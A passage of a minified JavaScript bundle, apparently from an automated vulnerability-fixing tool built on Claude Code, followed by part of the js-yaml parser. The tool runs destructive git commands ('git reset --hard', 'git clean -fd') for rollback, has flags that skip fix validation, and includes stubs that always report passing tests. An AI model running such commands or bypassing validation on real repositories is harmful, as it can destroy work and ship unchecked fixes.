z={provider:"anthropic",apiKey:J.aiProvider.providerApiKey,model:J.aiProvider.model,temperature:0.1,maxTokens:J.aiProvider.maxTokens,useVendedCredentials:J.aiProvider.useVendedCredentials,claudeCodeConfig:{verboseLogging:!0,timeout:600000,executablePath:process.env.CLAUDE_CODE_PATH,useStructuredPhases:J.useStructuredPhases}},V=process.env.RSOLV_DEV_MODE==="true"&&process.env.RSOLV_USE_CLAUDE_MAX==="true"&&lG(),K;if(!V&&J.aiProvider.useVendedCredentials&&J.rsolvApiKey){process.env.RSOLV_API_KEY=J.rsolvApiKey,U.info("Set RSOLV_API_KEY environment variable for vended credentials");let{CredentialManagerSingleton:b}=await Promise.resolve().then(() => (sX(),YJ));K=await b.getInstance(J.rsolvApiKey),U.info("Using vended credentials singleton for Claude Code")}let Z,q=0,B=jh1(X,J),M=X;while(q<B){U.info(`Executing Claude Code to fix vulnerabilities (attempt ${q+1}/${B})...`);let b=V?new pG(z,process.cwd(),K):new ZJ(z,process.cwd(),K);if(V)U.info("\uD83D\uDE80 Using Claude Code Max (local authentication) for development");let h=q>0?{current:q+1,max:B}:void 0,L={summary:`${G.issueType} issue analysis`,complexity:G.estimatedComplexity==="simple"?"low":G.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[G.suggestedApproach],recommendedApproach:G.suggestedApproach,relatedFiles:G.filesToModify};if(Z=await b.generateSolutionWithGit(M,L,void 0,H,void 0,h),!Z.success)return{issueId:X.id,success:!1,message:Z.message,error:Z.error};U.info(`[DEBUG] DISABLE_FIX_VALIDATION env var: ${process.env.DISABLE_FIX_VALIDATION}`),U.info(`[DEBUG] config.fixValidation?.enabled: ${J.fixValidation?.enabled}`),U.info(`[DEBUG] config.testGeneration?.validateFixes: ${J.testGeneration?.validateFixes}`);let N=J.fixValidation?.enabled===!1;if(U.info(`[DEBUG] skipValidation calculated as: ${N}`),N){U.info("\uD83D\uDCCB Skipping fix validation (DISABLE_FIX_VALIDATION=true)"),U.info("Fix will be applied without validation - proceeding to PR creation");break}if(J.testGeneration?.validateFixes===!0||J.fixValidation?.enabled===!0||J.fixValidation?.enabled!==!1&&H?.generatedTests?.success){let{shouldUseStaticValidation:_}=await Promise.resolve().then(() => (rG(),iG)),c=G.vulnerabilityType||"unknown",a=G.filesToModify?.[0]||"",J1=!1,q1=null;if(_(c,a)){U.info(`Validating fix with static analysis for ${c} in ${a}...`);let{StaticXSSValidator:_1}=await Promise.resolve().then(() => (rG(),iG)),k1=new _1().validateXSSFix(a,Y,W8(Z)?Z.commitHash:"HEAD");if(k1.isValidFix)U.info("✅ Fix validated successfully using static analysis"),U.info(`Safe patterns found: ${k1.safePatterns.join(", ")}`),J1=!0;else U.warn("❌ Static validation failed"),U.warn(`Vulnerable patterns still present: ${k1.vulnerablePatterns.join(", ")}`),q1={isValidFix:!1,error:k1.error,vulnerablePatterns:k1.vulnerablePatterns,fixedCommit:{redTestPassed:!1,greenTestPassed:!1,refactorTestPassed:!0}}}else if(H?.generatedTests?.success&&H.generatedTests.testSuite)if(U.info("Validating fix with pre-generated executable tests..."),q1=await new oX().validateFixWithTests(Y,W8(Z)?Z.commitHash:"HEAD",H.generatedTests.testSuite),q1.isValidFix)U.info("✅ Fix validated successfully with tests"),J1=!0;else U.warn("❌ Runtime test validation failed"),J1=!1;else U.warn("⚠️ No validation available, proceeding without validation"),J1=!0;if(J1)break;if(q++,q>=B){if(process.env.RSOLV_TESTING_MODE==="true"){U.warn(`[TEST MODE] Fix validation failed after ${B} attempts, but creating PR anyway for inspection`);let k1=J1===!1&&c==="XSS"&&a.includes("config/")?"Static analysis shows vulnerable patterns still present (document.write with location.host)":"Fix validation failed - tests did not pass";if(U.info("[TEST MODE] Keeping attempted fix for PR creation"),Z)Z.isTestMode=!0,Z.validationFailed=!0,Z.testModeNote=`Validation failed: ${k1}`;break}U.warn(`Fix validation failed after ${B} attempts, rolling back`),p6(`git reset --hard ${Y}`,{encoding:"utf-8"});let M1=J1===!1&&c==="XSS"&&a.includes("config/")?"Static analysis shows vulnerable patterns still present (document.write with location.host)":"Fix validation failed - tests did not pass";return{issueId:X.id,success:!1,message:`Fix validation failed after ${B} attempts`,error:M1}}if(U.info(`Fix iteration ${q}: Previous fix failed validation`),p6(`git reset --hard ${Y}`,{encoding:"utf-8"}),q1)if(q1.vulnerablePatterns)M={...X,specificVulnerabilities:X.specificVulnerabilities,body:`${X.body}

## Previous Fix Attempt Failed (Static Analysis)

Your fix did not remove the vulnerable patterns:
- Still present: ${q1.vulnerablePatterns.join(", ")}

### Required Fix:
For config/env/development.js XSS, you MUST:
1. Remove document.write with location.host concatenation
2. Use createElement('script') and appendChild instead
3. Or hardcode localhost:35729 without using location.host

### Example Safe Fix:
\`\`\`javascript
environmentalScripts: [
  \`<script>
    (function() {
      var script = document.createElement('script');
      script.src = 'http://localhost:35729/livereload.js';
      document.body.appendChild(script);
    })();
  </script>\`
]
\`\`\`

This is attempt ${q+1} of ${B}.`};else M=Fh1(X,q1,H,q,B);else M=X;continue}break}let O=W8(Z)?Z.commitHash:void 0;U.info(`Creating PR from commit ${O?.substring(0,8)||"HEAD"}`);let R=process.env.RSOLV_EDUCATIONAL_PR!=="false",I=Z?.isTestMode?{isTestMode:Z.isTestMode,validationFailed:Z.validationFailed,testModeNote:Z.testModeNote}:{},F=R&&W8(Z)?await VQ(X,Z.commitHash,{...Z.summary,vulnerabilityType:G.vulnerabilityType||"security",severity:G.severity||"medium",cwe:G.cwe,isAiGenerated:G.isAiGenerated,...I},J,Z.diffStats):W8(Z)?await KQ(X,Z.commitHash,{...Z.summary,...I},J,Z.diffStats):null;if(!F||!F.success){try{p6("git reset --hard HEAD~1",{encoding:"utf-8"}),U.info("Rolled back commit after PR creation failure")}catch(b){U.warn("Failed to rollback commit",b)}return{issueId:X.id,success:!1,message:F?.message||"Failed to create PR",error:F?.error||"Unknown error"}}let T=Date.now()-Q;return U.info(`Successfully processed issue #${X.number} in ${T}ms`),{issueId:X.id,success:!0,message:`Created PR #${F.pullRequestNumber}`,pullRequestUrl:F.pullRequestUrl,pullRequestNumber:F.pullRequestNumber,filesModified:W8(Z)?Z.filesModified:void 0,diffStats:W8(Z)?Z.diffStats:void 0}}catch(W){U.error(`Error processing issue #${X.number}`,W);try{p6(`git reset --hard ${Y}`,{encoding:"utf-8"})}catch(G){U.warn("Failed to rollback after error",G)}return{issueId:X.id,success:!1,message:"Error processing issue",error:W instanceof Error?W.message:String(W)}}}function _D(){try{let X=p6("git status --porcelain",{encoding:"utf-8"}).trim();if(!X)return{clean:!0,modifiedFiles:[]};let J=X.split(`
`).map((Q)=>Q.substring(2).trim()).filter((Q)=>Q.length>0).filter((Q)=>!Q.startsWith(".rsolv/"));if(J.length===0)return{clean:!0,modifiedFiles:[]};return{clean:!1,modifiedFiles:J}}catch(X){return U.error("Failed to check git status",X),{clean:!1,modifiedFiles:["unknown"]}}}function Dh1(){try{if(p6("git status --porcelain",{encoding:"utf-8"}).trim())U.info("Cleaning up uncommitted changes and untracked files"),p6("git reset --hard HEAD",{encoding:"utf-8"}),p6("git clean -fd",{encoding:"utf-8"}),U.info("Git state cleaned")}catch(X){U.error("Failed to clean git state",X)}}var kD=s(()=>{I1();WJ();zQ();dG();dG();qG();ZG();m4();c4()});var vD={};N0(vD,{processIssues:()=>wh1,processIssueWithEnhancedContext:()=>bD});async function wh1(X,J,Q={},Y){U.info(`Processing ${X.length} issues with AI`);let W=[];for(let G of X)try{U.info(`Processing issue #${G.number}: ${G.title}`);let H=await bD(G,J,Q,Y);if(W.push(H),H.success)U.info(`Successfully processed issue #${G.number}. PR: ${H.pullRequestUrl}`);else U.warn(`Failed to process issue #${G.number}: ${H.message}`)}catch(H){U.error(`Error processing issue #${G.number}`,H),W.push({issueId:G.id,success:!1,message:S9(`Error processing issue: ${H instanceof Error?H.message:String(H)}`),error:S9(String(H))})}return W}async function bD(X,J,Q={},Y){let W=Date.now();try{if(J.useGitBasedEditing){U.info(`Using git-based in-place editing for issue #${X.number}`);try{let Z=await ED(X,J);return{issueId:X.id,success:Z.success,message:Z.message,pullRequestUrl:Z.pullRequestUrl,error:Z.error,enhancedSolution:!0}}catch(Z){U.error("Git-based processing failed, falling back to standard processing",Z)}}U.info(`Analyzing issue #${X.number}`);let G,H;if(Q.enableSecurityAnalysis&&J.enableSecurityAnalysis!==!1){U.info(`Using security-aware analysis for issue #${X.number}`);let q=await new E7().analyzeWithSecurity(X,J);G=q,H=q.securityAnalysis}else G=await Z6(X,J,Y?.aiClient);if(!G||!G.canBeFixed)return{issueId:X.id,success:!1,message:"Issue cannot be automatically fixed based on analysis"};U.info(`Generating solution for issue #${X.number}`),U.info("Config aiProvider:",JSON.stringify(J.aiProvider));let z,$,V;if(!Q.enableEnhancedContext&&J.aiProvider.provider==="claude-code"){U.info("Using single-pass Claude Code adapter for optimized processing");let Z={provider:J.aiProvider.provider,apiKey:J.aiProvider.providerApiKey,model:J.aiProvider.model,temperature:J.aiProvider.temperature,maxTokens:J.aiProvider.maxTokens,useVendedCredentials:J.aiProvider.useVendedCredentials,claudeCodeConfig:{...J.claudeCodeConfig,enableDeepContext:!1,contextDepth:"shallow",timeout:420000,verboseLogging:Q.verboseLogging||!1}},q;if(J.aiProvider.useVendedCredentials&&J.rsolvApiKey){process.env.RSOLV_API_KEY=J.rsolvApiKey,U.info("Set RSOLV_API_KEY environment variable for vended credentials"),U.info("Getting credential manager singleton for vended credentials");let{CredentialManagerSingleton:R}=await Promise.resolve().then(() => (sX(),YJ));q=await R.getInstance(J.rsolvApiKey)}let B=Date.now(),M=new uG(Z,process.cwd(),q),O={summary:`${G.issueType} issue requiring ${G.estimatedComplexity} fix`,complexity:G.estimatedComplexity==="simple"?"low":G.estimatedComplexity==="complex"?"high":"medium",estimatedTime:60,potentialFixes:[G.suggestedApproach],recommendedApproach:G.suggestedApproach,relatedFiles:G.filesToModify};z=await M.generateSolutionWithContext(X,O,void 0,H),$=Date.now()-B,U.info(`Single-pass processing completed in ${$}ms`)}else if(Q.enableEnhancedContext&&J.aiProvider.provider==="claude-code"){let Z={provider:J.aiProvider.provider,apiKey:J.aiProvider.providerApiKey,model:J.aiProvider.model,temperature:J.aiProvider.temperature,maxTokens:J.aiProvider.maxTokens,useVendedCredentials:J.aiProvider.useVendedCredentials,claudeCodeConfig:{...J.claudeCodeConfig,enableDeepContext:!0,enableUltraThink:Q.contextDepth==="ultra",contextDepth:Q.contextDepth||"deep",contextGatheringTimeout:Q.contextGatheringTimeout||600000,verboseLogging:Q.verboseLogging||!1}},q;if(U.info(`Enhanced context setup - useVendedCredentials: ${J.aiProvider.useVendedCredentials}, rsolvApiKey: ${J.rsolvApiKey?"present":"missing"}`),J.aiProvider.useVendedCredentials&&J.rsolvApiKey){process.env.RSOLV_API_KEY=J.rsolvApiKey,U.info("Set RSOLV_API_KEY environment variable for vended credentials"),U.info("Getting credential manager singleton for vended credentials");let{CredentialManagerSingleton:O}=await Promise.resolve().then(() => (sX(),YJ));q=await O.getInstance(J.rsolvApiKey),U.info("Credential manager singleton retrieved successfully")}else U.info(`Skipping credential manager - useVended: ${J.aiProvider.useVendedCredentials}, apiKey: ${J.rsolvApiKey?"present":"missing"}`);let B=Date.now();U.info(`Creating EnhancedClaudeCodeAdapter with credentialManager: ${!!q}`),V=await new mG(Z,process.cwd(),q).gatherDeepContext(X,{contextDepth:Q.contextDepth||"medium",maxExplorationTime:Q.contextGatheringTimeout||600000,enableUltraThink:Q.contextDepth==="ultra",includeArchitectureAnalysis:!0,includeTestPatterns:!0,includeStyleGuide:!0,includeDependencyAnalysis:!0}),$=Date.now()-B,z=await gG(X,G,J,Y?.aiClient,Y?.fileGetter,H)}else z=await gG(X,G,J,Y?.aiClient,Y?.fileGetter,H);if(!z||!z.success||!z.changes||Object.keys(z.changes).length===0)return{issueId:X.id,success:!1,message:z?.message||"No solution generated"};U.info(`Creating pull request for issue #${X.number}`);let K=await DD(X,z.changes,G,J,H,z.explanations);return{issueId:X.id,success:K.success,pullRequestUrl:K.pullRequestUrl,message:K.message,analysisData:G,contextGatheringTime:$,deepContext:Q.verboseLogging?V:void 0,enhancedSolution:Q.enableEnhancedContext,securityAnalysis:H}}catch(G){return U.error(`Error processing issue #${X.number}`,G),{issueId:X.id,success:!1,message:S9(`Error processing issue: ${G instanceof Error?G.message:String(G)}`),error:S9(String(G))}}}var fD=s(()=>{I1();WJ();S3();AD();wD();LD();ID();kD()});var hD={};N0(hD,{runTests:()=>xD,default:()=>Nh1});async function xD(X){return{passed:!0,failed:0,total:X.length||0,details:X.map((J)=>({name:J.name||"test",passed:!0}))}}var Nh1;var yD=s(()=>{Nh1=xD});var mD={};N0(mD,{default:()=>Lh1,createPullRequest:()=>gD});async function gD(X){return{number:790,url:"https://github.com/test/webapp/pull/790",title:X.title}}var Lh1;var uD=s(()=>{Lh1={createPullRequest:gD}});import*as M5 from"fs";/*! js-yaml 4.1.0 https://github.com/nodeca/js-yaml @license MIT */function MH(X){return typeof X>"u"||X===null}function aD(X){return typeof X==="object"&&X!==null}function nD(X){if(Array.isArray(X))return X;else if(MH(X))return[];return[X]}function sD(X,J){var Q,Y,W,G;if(J){G=Object.keys(J);for(Q=0,Y=G.length;Q<Y;Q+=1)W=G[Q],X[W]=J[W]}return X}function oD(X,J){var Q="",Y;for(Y=0;Y<J;Y+=1)Q+=X;return Q}function tD(X){return X===0&&Number.NEGATIVE_INFINITY===1/X}var eD=MH,Xw=aD,Jw=nD,Qw=oD,Yw=tD,Ww=sD,P0={isNothing:eD,isObject:Xw,toArray:Jw,repeat:Qw,isNegativeZero:Yw,extend:Ww};function jH(X,J){var Q="",Y=X.reason||"(unknown reason)";if(!X.mark)return Y;if(X.mark.name)Q+='in "'+X.mark.name+'" ';if(Q+="("+(X.mark.line+1)+":"+(X.mark.column+1)+")",!J&&X.mark.snippet)Q+=`

`+X.mark.snippet;return Y+" "+Q}function wJ(X,J){if(Error.call(this),this.name="YAMLException",this.reason=X,this.mark=J,this.message=jH(this,!1),Error.captureStackTrace)Error.captureStackTrace(this,this.constructor);else this.stack=Error().stack||""}wJ.prototype=Object.create(Error.prototype);wJ.prototype.constructor=wJ;wJ.prototype.toString=function(J){return this.name+": "+jH(this,J)};var W9=wJ;function kQ(X,J,Q,Y,W){var G="",H="",z=Math.floor(W/2)-1;if(Y-J>z)G=" ... ",J=Y-z+G.length;if(Q-Y>z)H=" ...",Q=Y+z-H.length;return{str:G+X.slice(J,Q).replace(/\t/g,"→")+H,pos:Y-J+G.length}}function bQ(X,J){return P0.repeat(" ",J-X.length)+X}function Gw(X,J){if(J=Object.create(J||null),!X.buffer)return null;if(!J.maxLength)J.maxLength=79;if(typeof J.indent!=="number")J.indent=1;if(typeof J.linesBefore!=="number")J.linesBefore=3;if(typeof J.linesAfter!=="number")J.linesAfter=2;var Q=/\r?\n|\r|\0/g,Y=[0],W=[],G,H=-1;while(G=Q.exec(X.buffer))if(W.push(G.index),Y.push(G.index+G[0].length),X.position<=G.index&&H<0)H=Y.length-2;if(H<0)H=Y.length-1;var z="",$,V,K=Math.min(X.line+J.linesAfter,W.length).toString().length,Z=J.maxLength-(J.indent+K+3);for($=1;$<=J.linesBefore;$++){if(H-$<0)break;V=kQ(X.buffer,Y[H-$],W[H-$],X.position-(Y[H]-Y[H-$]),Z),z=P0.repeat(" ",J.indent)+bQ((X.line-$+1).toString(),K)+" | "+V.str+`
`+z}V=kQ(X.buffer,Y[H],W[H],X.position,Z),z+=P0.repeat(" ",J.indent)+bQ((X.line+1).toString(),K)+" | "+V.str+`
`,z+=P0.repeat("-",J.indent+K+3+V.pos)+`^
`;for($=1;$<=J.linesAfter;$++){if(H+$>=W.length)break;V=kQ(X.buffer,Y[H+$],W[H+$],X.position-(Y[H]-Y[H+$]),Z),z+=P0.repeat(" ",J.indent)+bQ((X.line+$+1).toString(),K)+" | "+V.str+`
`}return z.replace(/\n$/,"")}var Hw=Gw,zw=["kind","multi","resolve","construct","instanceOf","predicate","represent","representName","defaultStyle","styleAliases"],$w=["scalar","sequence","mapping"];function Vw(X){var J={};if(X!==null)Object.keys(X).forEach(function(Q){X[Q].forEach(function(Y){J[String(Y)]=Q})});return J}function Kw(X,J){if(J=J||{},Object.keys(J).forEach(function(Q){if(zw.indexOf(Q)===-1)throw new W9('Unknown option "'+Q+'" is met in definition of "'+X+'" YAML type.')}),this.options=J,this.tag=X,this.kind=J.kind||null,this.resolve=J.resolve||function(){return!0},this.construct=J.construct||function(Q){return Q},this.instanceOf=J.instanceOf||null,this.predicate=J.predicate||null,this.represent=J.represent||null,this.representName=J.representName||null,this.defaultStyle=J.defaultStyle||null,this.multi=J.multi||!1,this.styleAliases=Vw(J.styleAliases||null),$w.indexOf(this.kind)===-1)throw new W9('Unknown kind "'+this.kind+'" is specified for "'+X+'" YAML type.')}var m0=Kw;function XH(X,J){var Q=[];return X[J].forEach(function(Y){var W=Q.length;Q.forEach(function(G,H){if(G.tag===Y.tag&&G.kind===Y.kind&&G.multi===Y.multi)W=H}),Q[W]=Y}),Q}function Uw(){var X={scalar:{},sequence:{},mapping:{},fallback:{},multi:{scalar:[],sequence:[],mapping:[],fallback:[]}},J,Q;function Y(W){if(W.multi)X.multi[W.kind].push(W),X.multi.fallback.push(W);else X[W.kind][W.tag]=X.fallback[W.tag]=W}for(J=0,Q=arguments.length;J<Q;J+=1)arguments[J].forEach(Y);return X}function fQ(X){return this.extend(X)}fQ.prototype.extend=function(J){var Q=[],Y=[];if(J instanceof m0)Y.push(J);else if(Array.isArray(J))Y=Y.concat(J);else if(J&&(Array.isArray(J.implicit)||Array.isArray(J.explicit))){if(J.implicit)Q=Q.concat(J.implicit);if(J.explicit)Y=Y.concat(J.explicit)}else throw new W9("Schema.extend argument should be a Type, [ Type ], or a schema definition ({ implicit: [...], explicit: [...] })");Q.forEach(function(G){if(!(G instanceof m0))throw new W9("Specified list of YAML types (or a single Type object) contains a non-Type object.");if(G.loadKind&&G.loadKind!=="scalar")throw new W9("There is a non-scalar type in the implicit list of a schema. Implicit resolving of such types is not supported.");if(G.multi)throw new W9("There is a multi type in the implicit list of a schema. Multi tags can only be listed as explicit.")}),Y.forEach(function(G){if(!(G instanceof m0))throw new W9("Specified list of YAML types (or a single Type object) contains a non-Type object.")});var W=Object.create(fQ.prototype);return W.implicit=(this.implicit||[]).concat(Q),W.explicit=(this.explicit||[]).concat(Y),W.compiledImplicit=XH(W,"implicit"),W.compiledExplicit=XH(W,"explicit"),W.compiledTypeMap=Uw(W.compiledImplicit,W.compiledExplicit),W};var Zw=fQ,qw=new m0("tag:yaml.org,2002:str",{kind:"scalar",construct:function(X){return X!==null?X:""}}),Bw=new m0("tag:yaml.org,2002:seq",{kind:"sequence",construct:function(X){return X!==null?X:[]}}),Mw=new m0("tag:yaml.org,2002:map",{kind:"mapping",construct:function(X){return X!==null?X:{}}}),jw=new Zw({explicit:[qw,Bw,Mw]});function Ow(X){if(X===null)return!0;var J=X.length;return J===1&&X==="~"||J===4&&(X==="null"||X==="Null"||X==="NULL")}function Fw(){return null}function Rw(X){return X===null}var Aw=new m0("tag:yaml.org,2002:null",{kind:"scalar",resolve:Ow,construct:Fw,predicate:Rw,represent:{canonical:function(){return"~"},lowercase:function(){return"null"},uppercase:function(){return"NULL"},camelcase:function(){return"Null"},empty:function(){return""}},defaultStyle:"lowercase"});function Dw(X){if(X===null)return!1;var J=X.length;return J===4&&(X==="true"||X==="True"||X==="TRUE")||J===5&&(X==="false"||X==="False"||X==="FALSE")}function ww(X){return X==="true"||X==="True"||X==="TRUE"}function Nw(X){return Object.prototype.toString.call(X)==="[object Boolean]"}var Lw=new m0("tag:yaml.org,2002:bool",{kind:"scalar",resolve:Dw,construct:ww,predicate:Nw,represent:{lowercase:function(X){return X?"true":"false"},uppercase:function(X){return X?"TRUE":"FALSE"},camelcase:function(X){return X?"True":"False"}},defaultStyle:"lowercase"});function Iw(X){return 48<=X&&X<=57||65<=X&&X<=70||97<=X&&X<=102}function Cw(X){return 48<=X&&X<=55}function Pw(X){return 48<=X&&X<=57}function Sw(X){if(X===null)return!1;var J=X.length,Q=0,Y=!1,W;if(!J)return!1;if(W=X[Q],W==="-"||W==="+")W=X[++Q];if(W==="0"){if(Q+1===J)return!0;if(W=X[++Q],W==="b"){Q++;for(;Q<J;Q++){if(W=X[Q],W==="_")continue;if(W!=="0"&&W!=="1")return!1;Y=!0}return Y&&W!=="_"}if(W==="x"){Q++;for(;Q<J;Q++){if(W=X[Q],W==="_")continue;if(!Iw(X.charCodeAt(Q)))return!1;Y=!0}return Y&&W!=="_"}if(W==="o"){Q++;for(;Q<J;Q++){if(W=X[Q],W==="_")continue;if(!Cw(X.charCodeAt(Q)))return!1;Y=!0}return Y&&W!=="_"}}if(W==="_")return!1;for(;Q<J;Q++){if(W=X[Q],W==="_")continue;if(!Pw(X.charCodeAt(Q)))return!1;Y=!0}if(!Y||W==="_")return!1;return!0}function Tw(X){var J=X,Q=1,Y;if(J.indexOf("_")!==-1)J=J.replace(/_/g,"");if(Y=J[0],Y==="-"||Y==="+"){if(Y==="-")Q=-1;J=J.slice(1),Y=J[0]}if(J==="0")return 0;if(Y==="0"){if(J[1]==="b")return Q*parseInt(J.slice(2),2);if(J[1]==="x")return Q*parseInt(J.slice(2),16);if(J[1]==="o")return Q*parseInt(J.slice(2),8)}return Q*parseInt(J,10)}function _w(X){return Object.prototype.toString.call(X)==="[object Number]"&&(X%1===0&&!P0.isNegativeZero(X))}var Ew=new m0("tag:yaml.org,2002:int",{kind:"scalar",resolve:Sw,construct:Tw,predicate:_w,represent:{binary:function(X){return X>=0?"0b"+X.toString(2):"-0b"+X.toString(2).slice(1)},octal:function(X){return X>=0?"0o"+X.toString(8):"-0o"+X.toString(8).slice(1)},decimal:function(X){return X.toString(10)},hexadecimal:function(X){return X>=0?"0x"+X.toString(16).toUpperCase():"-0x"+X.toString(16).toUpperCase().slice(1)}},defaultStyle:"decimal",styleAliases:{binary:[2,"bin"],octal:[8,"oct"],decimal:[10,"dec"],hexadecimal:[16,"hex"]}}),kw=new RegExp("^(?:[-+]?(?:[0-9][0-9_]*)(?:\\.[0-9_]*)?(?:[eE][-+]?[0-9]+)?|\\.[0-9_]+(?:[eE][-+]?[0-9]+)?|[-+]?\\.(?:inf|Inf|INF)|\\.(?:nan|NaN|NAN))$");function bw(X){if(X===null)return!1;if(!kw.test(X)||X[X.length-1]==="_")return!1;return!0}function vw(X){var J,Q;if(J=X.replace(/_/g,"").toLowerCase(),Q=J[0]==="-"?-1:1,"+-".indexOf(J[0])>=0)J=J.slice(1);if(J===".inf")return Q===1?Number.POSITIVE_INFINITY:Number.NEGATIVE_INFINITY;else if(J===".nan")return NaN;return Q*parseFloat(J,10)}var fw=/^[-+]?[0-9]+e/;function xw(X,J){var Q;if(isNaN(X))switch(J){case"lowercase":return".nan";case"uppercase":return".NAN";case"camelcase":return".NaN"}else if(Number.POSITIVE_INFINITY===X)switch(J){case"lowercase":return".inf";case"uppercase":return".INF";case"camelcase":return".Inf"}else if(Number.NEGATIVE_INFINITY===X)switch(J){case"lowercase":return"-.inf";case"uppercase":return"-.INF";case"camelcase":return"-.Inf"}else if(P0.isNegativeZero(X))return"-0.0";return Q=X.toString(10),fw.test(Q)?Q.replace("e",".e"):Q}function hw(X){return Object.prototype.toString.call(X)==="[object Number]"&&(X%1!==0||P0.isNegativeZero(X))}var yw=new m0("tag:yaml.org,2002:float",{kind:"scalar",resolve:bw,construct:vw,predicate:hw,represent:xw,defaultStyle:"lowercase"}),gw=jw.extend({implicit:[Aw,Lw,Ew,yw]}),mw=gw,OH=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])$"),FH=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9]?)-([0-9][0-9]?)(?:[Tt]|[ \\t]+)([0-9][0-9]?):([0-9][0-9]):([0-9][0-9])(?:\\.([0-9]*))?(?:[ \\t]*(Z|([-+])([0-9][0-9]?)(?::([0-9][0-9]))?))?$");function uw(X){if(X===null)return!1;if(OH.exec(X)!==null)return!0;if(FH.exec(X)!==null)return!0;return!1}function cw(X){var J,Q,Y,W,G,H,z,$=0,V=null,K,Z,q;if(J=OH.exec(X),J===null)J=FH.exec(X);if(J===null)throw Error("Date resolve error");if(Q=+J[1],Y=+J[2]-1,W=+J[3],!J[4])return new Date(Date.UTC(Q,Y,W));if(G=+J[4],H=+J[5],z=+J[6],J[7]){$=J[7].slice(0,3);while($.length<3)$+="0";$=+$}if(J[9]){if(K=+J[10],Z=+(J[11]||0),V=(K*60+Z)*60000,J[9]==="-")V=-V}if(q=new Date(Date.UTC(Q,Y,W,G,H,z,$)),V)q.setTime(q.getTime()-V);return q}function lw(X){return X.toISOString()}var pw=new m0("tag:yaml.org,2002:timestamp",{kind:"scalar",resolve:uw,construct:cw,instanceOf:Date,represent:lw});function dw(X){return X==="<<"||X===null}var iw=new m0("tag:yaml.org,2002:merge",{kind:"scalar",resolve:dw}),mQ=`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
\r`;function rw(X){if(X===null)return!1;var J,Q,Y=0,W=X.length,G=mQ;for(Q=0;Q<W;Q++){if(J=G.indexOf(X.charAt(Q)),J>64)continue;if(J<0)return!1;Y+=6}return Y%8===0}function aw(X){var J,Q,Y=X.replace(/[\r\n=]/g,""),W=Y.length,G=mQ,H=0,z=[];for(J=0;J<W;J++){if(J%4===0&&J)z.push(H>>16&255),z.push(H>>8&255),z.push(H&255);H=H<<6|G.indexOf(Y.charAt(J))}if(Q=W%4*6,Q===0)z.push(H>>16&255),z.push(H>>8&255),z.push(H&255);else if(Q===18)z.push(H>>10&255),z.push(H>>2&255);else if(Q===12)z.push(H>>4&255);return new Uint8Array(z)}function nw(X){var J="",Q=0,Y,W,G=X.length,H=mQ;for(Y=0;Y<G;Y++){if(Y%3===0&&Y)J+=H[Q>>18&63],J+=H[Q>>12&63],J+=H[Q>>6&63],J+=H[Q&63];Q=(Q<<8)+X[Y]}if(W=G%3,W===0)J+=H[Q>>18&63],J+=H[Q>>12&63],J+=H[Q>>6&63],J+=H[Q&63];else if(W===2)J+=H[Q>>10&63],J+=H[Q>>4&63],J+=H[Q<<2&63],J+=H[64];else if(W===1)J+=H[Q>>2&63],J+=H[Q<<4&63],J+=H[64],J+=H[64];return J}function sw(X){return Object.prototype.toString.call(X)==="[object Uint8Array]"}var ow=new m0("tag:yaml.org,2002:binary",{kind:"scalar",resolve:rw,construct:aw,predicate:sw,represent:nw}),tw=Object.prototype.hasOwnProperty,ew=Object.prototype.toString;function XN(X){if(X===null)return!0;var J=[],Q,Y,W,G,H,z=X;for(Q=0,Y=z.length;Q<Y;Q+=1){if(W=z[Q],H=!1,ew.call(W)!=="[object Object]")return!1;for(G in W)if(tw.call(W,G))if(!H)H=!0;else return!1;if(!H)return!1;if(J.indexOf(G)===-1)J.push(G);else return!1}return!0}function JN(X){return X!==null?X:[]}var QN=new m0("tag:yaml.org,2002:omap",{kind:"sequence",resolve:XN,construct:JN}),YN=Object.prototype.toString;function WN(X){if(X===null)return!0;var J,Q,Y,W,G,H=X;G=Array(H.length);for(J=0,Q=H.length;J<Q;J+=1){if(Y=H[J],YN.call(Y)!=="[object Object]")return!1;if(W=Object.keys(Y),W.length!==1)return!1;G[J]=[W[0],Y[W[0]]]}return!0}function GN(X){if(X===null)return[];var J,Q,Y,W,G,H=X;G=Array(H.length);for(J=0,Q=H.length;J<Q;J+=1)Y=H[J],W=Object.keys(Y),G[J]=[W[0],Y[W[0]]];return G}var HN=new m0("tag:yaml.org,2002:pairs",{kind:"sequence",resolve:WN,construct:GN}),zN=Object.prototype.hasOwnProperty;function $N(X){if(X===null)return!0;var J,Q=X;for(J in Q)if(zN.call(Q,J)){if(Q[J]!==null)return!1}return!0}function VN(X){return X!==null?X:{}}var KN=new m0("tag:yaml.org,2002:set",{kind:"mapping",resolve:$N,construct:VN}),RH=mw.extend({implicit:[pw,iw],explicit:[ow,QN,HN,KN]}),r6=Object.prototype.hasOwnProperty,W5=1,AH=2,DH=3,G5=4,vQ=1,UN=2,JH=3,ZN=/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]/,qN=/[\x85\u2028\u2029]/,BN=/[,\[\]\{\}]/,wH=/^(?:!|!!|![a-z\-]+!)$/i,NH=/^(?:!|[^,\[\]\{\}])(?:%[0-9a-f]{2}|[0-9a-z\-#;\/\?:@&=\+\$,_\.!~\*'\(\)\[\]])*$/i;function QH(X){return Object.prototype.toString.call(X)}function X6(X){return X===10||X===13}function DX(X){return X===9||X===32}function G9(X){return X===9||X===32||X===10||X===13}function $8(X){return X===44||X===91||X===93||X===123||X===125}function MN(X){var J;if(48<=X&&X<=57)return X-48;if(J=X|32,97<=J&&J<=102)return J-97+10;return-1}function jN(X){if(X===120)return 2;if(X===117)return 4;if(X===85)return 8;return 0}function ON(X){if(48<=X&&X<=57)return X-48;return-1}function YH(X){return X===48?"\x00":X===97?"\x07":X===98?"\b":X===116?"\t":X===9?"\t":X===110?`
